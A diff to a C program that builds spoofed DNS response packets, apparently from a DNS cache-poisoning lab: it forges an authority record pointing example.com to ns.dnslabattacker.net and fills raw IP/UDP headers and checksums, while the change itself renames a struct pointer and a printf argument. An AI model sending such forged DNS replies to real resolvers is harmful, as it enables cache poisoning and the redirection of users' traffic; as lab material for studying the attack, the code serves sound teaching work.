@@ -341,12 +341,12 @@ void responsePacket(char *dns_data, char *src_addr, char *dest_addr){
     strcpy(ns, "\7example\3com");
     int nslength = strlen(ns) + 1;
     
-    struct ansEnd *ansend = (struct ansEnd *)(ns + nslength);
-    nssend->type = htons(2);
-    nssend->class = htons(1);
-    nssend->ttl_l = htons(0x00);
-    nssend->ttl_u = htons(0xD0);
-    nssend->datalen = htons(23);
+    struct ansEnd *nsend = (struct ansEnd *)(ns + nslength);
+    nsend->type = htons(2);
+    nsend->class = htons(1);
+    nsend->ttl_l = htons(0x00);
+    nsend->ttl_u = htons(0xD0);
+    nsend->datalen = htons(23);
     
     char *nsname = (buffer + sizeof(struct ipheader) + sizeof(struct udpheader) + sizeof(struct dnsheader) + sizeof(struct dataEnd) + length + sizeof(struct ansEnd) + anslength + addrlen + sizeof(struct ansEnd) + nslength);
     strcpy(nsname, "\2ns\16dnslabattacker\3net");
@@ -418,7 +418,7 @@ void responsePacket(char *dns_data, char *src_addr, char *dest_addr){
     ip->iph_chksum = csum((unsigned short *)buffer, sizeof(struct ipheader) + sizeof(struct udpheader));
     udp->udph_chksum=check_udp_sum(buffer, packetLength-sizeof(struct ipheader));
     
-    printf("%s\n", end); 
+    printf("%s\n", data); 
 
     // Inform the kernel to not fill up the packet structure. we will build our own...
 /*    if(setsockopt(sd, IPPROTO_IP, IP_HDRINCL, val, sizeof(one))<0 )
